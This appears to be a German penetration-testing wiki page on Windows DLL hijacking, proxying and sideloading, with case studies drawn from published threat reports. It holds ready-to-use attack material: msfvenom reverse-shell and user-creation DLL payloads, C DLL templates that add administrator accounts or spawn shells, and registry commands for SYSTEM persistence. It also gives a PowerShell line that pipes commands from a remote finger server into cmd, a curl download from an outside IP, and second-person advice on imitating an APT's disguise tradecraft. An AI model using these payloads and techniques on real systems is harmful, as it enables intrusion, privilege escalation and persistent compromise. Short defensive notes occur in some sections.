Ein **DLL-Proxy** ist im Grunde eine DLL, die **deinen schädlichen Code beim Laden ausführen**, aber auch **wie erwartet funktionieren und die erwarteten Funktionen bereitstellen** kann, indem sie **alle Aufrufe an die echte Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du **eine ausführbare Datei angeben und die Bibliothek auswählen**, die du proxifizieren möchtest, und anschließend eine **proxifizierte DLL generieren**. Alternativ kannst du **die DLL angeben** und eine **proxifizierte DLL generieren**.

### **Meterpreter**

**Rev-Shell abrufen (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Meterpreter (x86) erhalten:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Benutzer erstellen (x86; eine x64-Version habe ich nicht gesehen):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Deine eigene

In vielen Fällen muss die von dir kompilierte DLL **jede Funktion exportieren, die vom Zielprozess importiert wird**. Fehlt ein erforderlicher Export, kann die Binärdatei ihn nicht auflösen und der Exploit schlägt fehl.

<details>
<summary>C-DLL-Vorlage (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++-DLL-Beispiel mit Benutzererstellung</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstieg</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Barrierefreiheit/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Localization-DLL, die für beliebige Codeausführung und Persistenz missbraucht werden kann.<sup>[[7]](#references)</sup>

Wichtige Fakten
- Prüfpfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Existiert am OneCore-Pfad eine beschreibbare, vom Angreifer kontrollierte DLL, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Exports sind nicht erforderlich.

Erkennung mit Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Narrator starten und beobachten, wie der Ladevorgang für den oben genannten Pfad versucht wird.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC-Ruhe
- Ein naiver Hijack gibt Sprachausgabe aus bzw. hebt die UI hervor. Um unauffällig zu bleiben, enumerierst du beim Attach die Narrator-Threads, öffnest den Hauptthread (`OpenThread(THREAD_SUSPEND_RESUME)`) und hältst ihn mit `SuspendThread` an; fahre in deinem eigenen Thread fort. Den vollständigen Code findest du im PoC.<sup>[[8]](#references)</sup>

Auslösen und Persistenz über die Accessibility-Konfiguration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit den obigen Einstellungen lädt der Start von Narrator die platzierte DLL. Drücke auf dem sicheren Desktop (Anmeldebildschirm) CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.

Durch RDP ausgelöste SYSTEM-Ausführung (laterale Bewegung)
- Klassische RDP-Sicherheitsebene zulassen: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Stelle eine RDP-Verbindung zum Host her und drücke am Anmeldebildschirm CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.
- Die Ausführung endet, wenn die RDP-Sitzung geschlossen wird – injiziere/migriere umgehend.

Bring Your Own Accessibility (BYOA)
- Du kannst einen integrierten Registry-Eintrag eines Accessibility Tools (AT) klonen (z. B. CursorIndicator), so bearbeiten, dass er auf eine beliebige Binärdatei/DLL verweist, ihn importieren und anschließend `configuration` auf den Namen dieses AT setzen. Dadurch wird beliebige Ausführung über das Accessibility-Framework vermittelt.

Hinweise
- Das Schreiben in `%windir%\System32` und das Ändern von HKLM-Werten erfordern Administratorrechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` enthalten sein; Exports sind nicht erforderlich.

## Fallstudie: CVE-2025-1729 - Privilege Escalation mit TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Schwachstellendetails

- **Komponente**: `TPQMAssistant.exe` befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplante Aufgabe**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` wird täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers ausgeführt.
- **Verzeichnisberechtigungen**: Für `CREATOR OWNER` beschreibbar, sodass lokale Benutzer beliebige Dateien ablegen können.
- **DLL-Suchverhalten**: Versucht zuerst, `hostfxr.dll` aus seinem Arbeitsverzeichnis zu laden, und protokolliert „NAME NOT FOUND“, wenn die Datei fehlt. Dies weist auf eine bevorzugte Suche im lokalen Verzeichnis hin.

### Exploit-Implementierung

Ein Angreifer kann eine bösartige `hostfxr.dll`-Stubdatei im selben Verzeichnis ablegen und so die fehlende DLL ausnutzen, um Code im Kontext des Benutzers auszuführen:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Angriffsablauf

1. Lege als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ab.
2. Warte, bis die geplante Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn bei der Ausführung der Aufgabe ein Administrator angemeldet ist, wird die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität ausgeführt.
4. Verknüpfe gängige UAC-Bypass-Techniken, um von mittlerer Integrität zu SYSTEM-Rechten zu wechseln.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading über einen signierten Host (wsc_proxy.exe)

Bedrohungsakteure kombinieren häufig MSI-basierte Dropper mit DLL Side-Loading, um Payloads in einem vertrauenswürdigen, signierten Prozess auszuführen.<sup>[[10]](#references)</sup>

Überblick über die Angriffskette
- Der Benutzer lädt eine MSI-Datei herunter. Während der Installation über die GUI führt eine CustomAction unbemerkt Aktionen aus (z. B. eine LaunchApplication- oder VBScript-Aktion) und setzt die nächste Stufe aus eingebetteten Ressourcen zusammen.
- Der Dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispiel: von Avast signierte wsc_proxy.exe + vom Angreifer kontrollierte wsc.dll).
- Beim Start der signierten EXE lädt die DLL-Suchreihenfolge von Windows zuerst wsc.dll aus dem Arbeitsverzeichnis und führt so den Code des Angreifers in einem signierten übergeordneten Prozess aus (ATT&CK T1574.001).

MSI-Analyse (worauf zu achten ist)
- CustomAction-Tabelle:
  - Achte auf Einträge, die ausführbare Dateien oder VBScript ausführen. Verdächtiges Beispiel: LaunchApplication führt im Hintergrund eine eingebettete Datei aus.
  - Untersuche in Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary.
- Eingebettete/geteilte Payloads im MSI-CAB:
  - Administrative Extraktion: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Oder verwende lessmsi: lessmsi x package.msi C:\out
  - Achte auf mehrere kleine Fragmente, die von einer VBScript-CustomAction verkettet und entschlüsselt werden. Typischer Ablauf:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktisches Sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien im selben Ordner ab:
  - wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll anhand des Namens aus seinem Verzeichnis zu laden.
  - wsc.dll: angreiferseitige DLL. Wenn keine bestimmten Exporte erforderlich sind, genügt DllMain; andernfalls erstelle eine Proxy-DLL und leite erforderliche Exporte an die echte Bibliothek weiter, während der Payload in DllMain ausgeführt wird.
- Erstelle einen minimalen DLL-Payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Für Export-Anforderungen sollte ein Proxy-Framework (z. B. DLLirant/Spartacus) verwendet werden, um eine Forwarding-DLL zu erzeugen, die auch deine Payload ausführt.

- Diese Technik basiert auf der DLL-Namensauflösung durch die Host-Binärdatei. Verwendet der Host absolute Pfade oder sichere Ladeflags (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), schlägt der Hijack möglicherweise fehl.
- KnownDLLs, SxS und weitergeleitete Exporte können die Reihenfolge beeinflussen und müssen bei der Auswahl der Host-Binärdatei und des Export-Sets berücksichtigt werden.

## Signierte Triaden + verschlüsselte Payloads (ShadowPad-Fallstudie)

Check Point beschrieb, wie Ink Dragon ShadowPad mithilfe einer **Drei-Dateien-Triade** einsetzt, um sich als legitime Software zu tarnen und gleichzeitig die Kern-Payload auf der Festplatte verschlüsselt zu halten:<sup>[[12]](#references)</sup>

1. **Signierte Host-EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei um, sodass sie wie eine Windows-Binärdatei aussieht (zum Beispiel `conhost.exe`), während die Authenticode-Signatur gültig bleibt.
2. **Bösartige Loader-DLL** – wird neben der EXE unter einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist üblicherweise eine mit dem ScatterBrain-Framework verschleierte MFC-Binärdatei. Ihre einzige Aufgabe besteht darin, den verschlüsselten Blob zu finden, ihn zu entschlüsseln und ShadowPad reflective zu mappen.
3. **Verschlüsselter Payload-Blob** – wird häufig als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem die entschlüsselte Payload in den Speicher gemappt wurde, löscht der Loader die TMP-Datei, um forensische Beweise zu vernichten.

Hinweise zum Tradecraft:

* Durch das Umbenennen der signierten EXE (wobei der ursprüngliche `OriginalFileName` im PE-Header erhalten bleibt) kann sie sich als Windows-Binärdatei tarnen und zugleich die Herstellersignatur behalten. Übernimm daher Ink Dragons Vorgehen, `conhost.exe`-ähnliche Binärdateien abzulegen, bei denen es sich tatsächlich um AMD-/NVIDIA-Utilities handelt.
* Da die ausführbare Datei weiterhin vertrauenswürdig ist, müssen die meisten Allowlisting-Kontrollen lediglich verhindern, dass deine bösartige DLL daneben abgelegt wird. Konzentriere dich darauf, die Loader-DLL anzupassen; der signierte Parent kann in der Regel unverändert ausgeführt werden.
* ShadowPads Decryptor erwartet, dass sich der TMP-Blob neben dem Loader befindet und beschreibbar ist, damit er die Datei nach dem Mapping mit Nullen überschreiben kann. Lass das Verzeichnis beschreibbar, bis die Payload geladen ist. Sobald sie sich im Speicher befindet, kann die TMP-Datei für OPSEC sicher gelöscht werden.

### LOLBAS-Stager + Sideloading-Kette mit gestaffeltem Archiv (finger → tar/curl → WMI)

Operatoren kombinieren DLL-Sideloading mit LOLBAS, sodass die bösartige DLL neben der vertrauenswürdigen EXE das einzige benutzerdefinierte Artefakt auf der Festplatte ist:<sup>[[1]](#references)</sup>

- **Remote-Command-Loader (Finger):** Verstecktes PowerShell startet `cmd.exe /c`, ruft Befehle von einem Finger-Server ab und leitet sie an `cmd` weiter:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` ruft Text über TCP/79 ab; `| cmd` führt die Serverantwort aus und ermöglicht es Operatoren, die zweite Stufe serverseitig auszutauschen.

- **Integrierter Download/Extraktion:** Ein Archiv mit einer unauffälligen Dateiendung herunterladen, entpacken und das Sideload-Ziel samt DLL in einem zufällig benannten `%LocalAppData%`-Ordner ablegen:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` blendet den Fortschritt aus und folgt Weiterleitungen; `tar -xf` verwendet das integrierte Windows-tar.

- **WMI/CIM-Start:** Starte die EXE über WMI, sodass die Telemetrie einen von CIM erstellten Prozess zeigt, während dieser die DLL aus demselben Verzeichnis lädt:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funktioniert mit Binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); das Payload (z. B. Remcos) läuft unter dem vertrauenswürdigen Namen.

- **Suche:** Alarm auslösen, wenn `forfiles` mit `/p`, `/m` und `/c` gemeinsam auftritt; außerhalb von Admin-Skripten ist das ungewöhnlich.


## Fallstudie: NSIS-Dropper + Bitdefender Submission Wizard Sideload (Chrysalis)

Bei einem kürzlichen Einbruch von Lotus Blossom wurde eine vertrauenswürdige Update-Kette missbraucht, um einen mit NSIS gepackten Dropper auszuliefern, der ein DLL-Sideload sowie vollständig im Arbeitsspeicher ausgeführte Payloads bereitstellte.<sup>[[13]](#references)</sup>

Ablauf der Vorgehensweise
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert den Ordner als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine bösartige `log.dll` und einen verschlüsselten Blob `BluetoothService` ab und startet anschließend die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den Blob per mmap; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten, LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Schlüsselmaterial aus einem vorherigen Hash abgeleitet), überschreibt den Puffer mit Klartext-Shellcode, gibt temporäre Daten frei und springt zu diesem.
- Um eine IAT zu vermeiden, löst der Loader APIs auf, indem er Exportnamen mit **FNV-1a-Basis 0x811C9DC5 + Primzahl 0x1000193** hasht, anschließend einen Murmur-artigen Avalanche-Schritt (**0x85EBCA6B**) anwendet und die Ergebnisse mit gesalzenen Ziel-Hashes vergleicht.

Haupt-Shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Hauptmodul, indem er in fünf Durchläufen Addition/XOR/Subtraktion mit dem Schlüssel `gQ2JR&9;` wiederholt, und lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Importauflösung abzuschließen.
- Rekonstruiert DLL-Namen zur Laufzeit über Bit-Rotate/XOR-Transformationen pro Zeichen und lädt anschließend `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Exporttabelle in 4-Byte-Blöcken mit Murmur-artigem Mixing parst und nur dann auf `GetProcAddress` zurückgreift, wenn der Hash nicht gefunden wird.

Eingebettete Konfiguration & C2
- Die Konfiguration befindet sich in der abgelegten Datei `BluetoothService` bei **Offset 0x30808** (Größe **0x980**) und wird mit dem RC4-Schlüssel `qwhvb^435h&*7` entschlüsselt. Dadurch werden die C2-URL und der User-Agent offengelegt.
- Beacons erstellen ein durch Punkte getrenntes Host-Profil, stellen das Tag `4Q` voran und verschlüsseln es anschließend mit dem RC4-Schlüssel `vAuig34%^325hGV`, bevor sie es per HTTPS über `HttpSendRequestA` senden. Antworten werden mit RC4 entschlüsselt und über einen Tag-Switch verteilt (`4T` Shell, `4V` Prozessausführung, `4W/4X` Dateischreiben, `4Y` Lesen/Exfil, `4\\` Deinstallation, `4` Laufwerks-/Dateiaufzählung + Fälle mit segmentierter Übertragung).
- Der Ausführungsmodus wird durch CLI-Argumente gesteuert: keine Argumente = Persistenz installieren (Dienst/Run-Schlüssel), der auf `-i` verweist; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt das Payload aus.

Beobachteter alternativer Loader
- Bei demselben Einbruch wurden Tiny C Compiler abgelegt und `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` ausgeführt, mit `libtcc.dll` daneben. Der vom Angreifer bereitgestellte C-Quellcode enthielt Shellcode, wurde kompiliert und im Arbeitsspeicher ausgeführt, ohne ein PE auf der Festplatte abzulegen. Nachbilden mit:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Diese TCC-basierte Compile-and-Run-Phase importierte `Wininet.dll` zur Laufzeit und lud Shellcode der zweiten Stufe von einer fest codierten URL herunter. So entstand ein flexibler Loader, der sich als Compilerlauf tarnte.

## Signed-Host-Sideloading mit Export-Proxying und Host-Thread-Parking

Einige DLL-Sideloading-Ketten ergänzen **Stabilitätsmaßnahmen**, damit der legitime Host lange genug aktiv bleibt, um spätere Stufen sauber zu laden, statt nach dem Laden der schädlichen DLL abzustürzen.<sup>[[11]](#references)</sup>

Beobachtetes Muster
- Eine vertrauenswürdige EXE zusammen mit einer schädlichen DLL unter dem erwarteten Abhängigkeitsnamen wie `version.dll` ablegen.
- Die schädliche DLL **proxyt alle erwarteten Exporte** an die echte System-DLL (z. B. `%SystemRoot%\\System32\\version.dll`), damit die Importauflösung weiterhin funktioniert und der Hostprozess weiterläuft.
- Nach dem Laden patcht die schädliche DLL **den Einstiegspunkt des Hosts**, sodass der Hauptthread in eine Endlosschleife mit `Sleep` gerät, statt den Prozess zu beenden oder Codepfade auszuführen, die ihn beenden würden.
- Ein neuer Thread führt die eigentliche schädliche Aktion aus: Er entschlüsselt den Namen oder Pfad der DLL der nächsten Stufe (häufig mit RC4/XOR) und startet sie dann mit `LoadLibrary`.

Warum das wichtig ist
- Normales DLL-Proxying erhält die API-Kompatibilität, garantiert aber nicht, dass der Host lange genug für spätere Stufen aktiv bleibt.
- Den Hauptthread mit `Sleep(INFINITE)` anzuhalten, ist eine einfache Möglichkeit, den signierten Prozess am Leben zu halten, während der Loader in einem Worker-Thread Entschlüsselung, Staging oder den Netzwerk-Bootstrap ausführt.
- Wer nur nach einer verdächtigen `DllMain` sucht, kann dieses Muster übersehen, wenn das interessante Verhalten erst nach dem Patchen des Host-Einstiegspunkts und dem Start eines sekundären Threads auftritt.

Minimaler Ablauf
1. Die signierte Host-EXE kopieren und ermitteln, welche DLL sie aus dem lokalen Verzeichnis lädt.
2. Eine Proxy-DLL erstellen, die dieselben Funktionen exportiert und an die legitime DLL weiterleitet.
3. In `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread erstellen.
4. Von diesem Thread aus den Host-Einstiegspunkt oder die Startfunktion des Hauptthreads patchen, sodass dieser in einer `Sleep`-Schleife läuft.
5. Den Namen oder die Konfiguration der DLL der nächsten Stufe entschlüsseln und `LoadLibrary` aufrufen oder die Payload manuell in den Prozess abbilden.

Ansatzpunkte für die Abwehr
- Signierte Prozesse, die `version.dll` oder ähnlich verbreitete Bibliotheken aus ihrem eigenen Anwendungsverzeichnis statt aus `System32` laden.
- Speicherpatches am Prozesseinstiegspunkt kurz nach dem Laden des Images, insbesondere Sprünge/Aufrufe, die zu `Sleep`/`SleepEx` umgeleitet werden.
- Von einer Proxy-DLL erstellte Threads, die unmittelbar `LoadLibrary` mit einer entschlüsselten DLL-Bezeichnung aufrufen.
- Proxy-DLLs mit vollständigem Exportsatz, die neben Hersteller-Executables in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden abgelegt sind.

## References

- [1] [Red Canary – Einblicke in die Bedrohungsanalyse: Januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – Rechteausweitung mit TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL-Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL-Hijacking in Windows. Einfaches C-Beispiel.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore setzt neue Malware gegen Europa ein](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wenn DLL-Hijacks auf Windows-Helfer treffen](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitale Doppelgänger: Anatomie sich weiterentwickelnder Identitätsvortäuschungskampagnen, die Gh0st RAT verbreiten](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zusammenlaufende Interessen: Analyse von Bedrohungsclustern, die eine südostasiatische Regierung ins Visier nehmen](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Einblick in Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckten offensiven Operation enthüllt](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Die Chrysalis-Backdoor: Ein tiefer Einblick in das Toolkit von Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL-Hijack-Kette](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Verfolgung der Spionagekampagnen von Iranian APT Screening Serpens aus dem Jahr 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Schnell und furios: Nimbus-Manticore-Operationen während des Iran-Konflikts](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Aufgabenaktionen](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 nimmt südostasiatische Regierungen und kritische Infrastruktur ins Visier](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
